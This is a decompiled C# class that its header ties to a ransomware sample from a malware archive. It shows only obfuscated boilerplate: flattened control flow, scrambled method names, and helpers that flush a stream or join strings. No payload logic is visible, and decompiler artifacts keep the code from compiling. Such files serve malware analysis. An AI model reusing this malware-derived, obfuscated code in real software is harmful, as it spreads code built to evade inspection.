// Decompiled with JetBrains decompiler
// Type: My.MyApplication
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using Microsoft.VisualBasic.ApplicationServices;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;

namespace My
{
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  [EditorBrowsable(EditorBrowsableState.Never)]
  internal sealed class MyApplication : ApplicationBase
  {
    public MyApplication()
    {
      try
      {
        try
        {
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException1(ex, (object) this);
          throw;
        }
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    static MyApplication()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static void Ⴃ([In] Stream obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
        num1 = 2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 3:
              goto label_7;
            case 4:
            case 5:
              num1 = 2;
              continue;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 51:
                  num2 = 3;
                  break;
                default:
                  num2 = 5;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.Flush();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Stream o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static string Ⴓ([In] object obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 19:
            num2 = 1;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 3;
              continue;
            case 1:
            case 7:
              goto label_8;
            case 3:
            case 4:
              goto label_3;
            case 6:
              num1 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (MyApplication.Ⴓ);
              num1 = 3;
              continue;
          }
        }
label_8:
        return obj0.ToString() + obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        object o2 = obj0;
        object o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, o2, o3, (object) o4, (object) o5);
        throw;
      }
    }
  }
}
